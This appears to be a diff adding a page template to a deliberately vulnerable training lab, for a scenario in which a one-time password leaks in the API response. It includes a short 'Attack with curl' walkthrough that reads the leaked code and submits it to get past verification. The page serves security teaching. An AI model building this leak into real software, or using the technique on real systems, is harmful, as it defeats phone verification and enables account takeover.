@@ -1,0 +1,85 @@
+<%- include('../partials/navbar') %>
+  <main class="main-content">
+    <div class="top-header"><span class="header-title">Phone Verification</span>
+      <div class="header-right"><a href="/otp" class="btn btn-secondary btn-sm">← OTP Lab</a>
+        <a href="/profile/<%= user.id %>" class="header-user"><div class="header-avatar"><%= ((user.first_name||user.username).charAt(0)).toUpperCase() %></div></a>
+      </div>
+    </div>
+    <div class="page-body">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px;max-width:900px;align-items:start;">
+        <div>
+          <div class="card" style="border-color:var(--warning);">
+            <div class="card-header" style="background:#FFFBEB;">
+              <h3>📤 Scenario 3 — OTP Leaked in Response</h3>
+              <span class="badge badge-warning">Info Disclosure</span>
+            </div>
+            <div class="card-body">
+              <p style="font-size:13px;color:var(--text-muted);margin-bottom:16px;">Click "Send OTP" then check the raw API response — the OTP is in the response body.</p>
+              <div id="send-result" style="display:none;margin-bottom:14px;"></div>
+              <div id="verify-result" style="display:none;margin-bottom:14px;"></div>
+              <button onclick="sendOTP()" class="btn btn-primary btn-lg" style="width:100%;margin-bottom:10px;">📲 Send OTP to Phone</button>
+              <div class="form-group"><label>Enter OTP (try reading it from the response above)</label>
+                <input type="text" id="otp-input" maxlength="6" placeholder="000000"
+                  style="font-size:24px;letter-spacing:8px;text-align:center;font-family:monospace;">
+              </div>
+              <button onclick="verifyOTP()" class="btn btn-success btn-lg" style="width:100%;">Verify</button>
+            </div>
+          </div>
+        </div>
+        <div>
+          <div class="card" style="margin-bottom:16px;">
+            <div class="card-header"><h3>Raw API Response</h3><span style="font-size:11px;color:var(--text-muted);">Watch here when you click Send OTP</span></div>
+            <div class="card-body" style="padding:0;">
+              <pre id="api-response" style="font-size:11px;padding:14px;min-height:160px;margin:0;border-radius:var(--radius);">// Click "Send OTP" to see the API response...</pre>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header"><h3>Attack with curl</h3></div>
+            <div class="card-body">
+              <pre style="font-size:11px;"># Step 1: Request OTP and read the response
+curl -X POST http://syntex.local/otp/leaked/send \
+  -H "Cookie: SYNTEX_SESS=YOUR_SESSION" \
+  -s | jq .
+
+# The response contains:
+# { "debug": { "otp_generated": "123456" },
+#   "otp": "123456" }
+
+# Step 2: Use the leaked OTP
+curl -X POST http://syntex.local/otp/leaked/verify \
+  -H "Cookie: SYNTEX_SESS=YOUR_SESSION" \
+  -H "Content-Type: application/json" \
+  -d '{"otp":"123456"}'</pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+</div><%- include('../partials/footer') %>
+<script>
+async function sendOTP() {
+    const r    = await fetch('/otp/leaked/send', { method:'POST', headers:{'Content-Type':'application/json'} });
+    const data = await r.json();
+    document.getElementById('api-response').textContent = JSON.stringify(data, null, 2);
+    const box = document.getElementById('send-result');
+    box.style.display = 'block';
+    const leaked = data.otp || data.debug?.otp_generated;
+    if (leaked) {
+        box.innerHTML = `<div class="alert alert-danger">⚠️ OTP Found in Response: <strong style="font-size:18px;font-family:monospace;letter-spacing:4px;">${leaked}</strong></div>`;
+        document.getElementById('otp-input').value = leaked;
+    } else {
+        box.innerHTML = `<div class="alert alert-success">OTP sent. Check the response panel →</div>`;
+    }
+}
+async function verifyOTP() {
+    const otp  = document.getElementById('otp-input').value;
+    const r    = await fetch('/otp/leaked/verify', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({otp}) });
+    const data = await r.json();
+    const box  = document.getElementById('verify-result');
+    box.style.display = 'block';
+    box.innerHTML = data.success
+        ? `<div class="alert alert-success">✅ Verified!<br><code style="color:var(--success);">🚩 ${data.flag}</code></div>`
+        : `<div class="alert alert-danger">❌ ${data.message}</div>`;
+}
+</script>
